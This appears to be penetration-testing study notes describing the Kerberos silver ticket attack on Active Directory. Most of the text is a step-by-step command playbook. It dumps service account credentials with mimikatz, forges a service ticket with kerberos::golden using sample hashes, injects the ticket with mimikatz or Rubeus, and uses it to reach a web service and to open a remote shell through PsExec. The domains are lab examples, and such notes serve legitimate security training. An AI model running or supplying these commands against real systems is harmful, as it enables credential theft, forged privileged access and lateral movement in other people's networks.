With the service account password or its associated NTLM hash at
hand, we can forge our own service ticket to access the target
resource (in our example, the IIS application) with any
permissions we desire. This custom-created ticket is known as a
#silver ticket* and if the service principal name is used on
multiple servers, the silver ticket can be leveraged against them
all.

We need to collect the following three pieces of information to
create a silver ticket:

- SPN password hash
- Domain SID
- Target SPN

To get the password hash of the SPN we can use a tool like
mimikatz. To get the domain SID we can do ~whoami /user~

# 1. Grab info service account hash with mimikatz
```bash
# Grab Service account hash with Mimikatz
privilege::debug
sekurlsa::logonpasswords

#Grabing SID for domain
whoami /user
# corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105

# Select your SPN
web04.corp.com
```


-----------------------

# 2. Create silver ticket
```bash
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

# Check cached ticket
klist
```

-----------------------

# 3. Use the ticket
```bash
iwr -UseDefaultCredentials http://web04
```

-----------------------

# HACKTRICKS
```bash
#Create the ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
#Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi
#Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd

#Example using aes key
kerberos::golden /user:Administrator /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /target:labwws02.jurassic.park /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
```
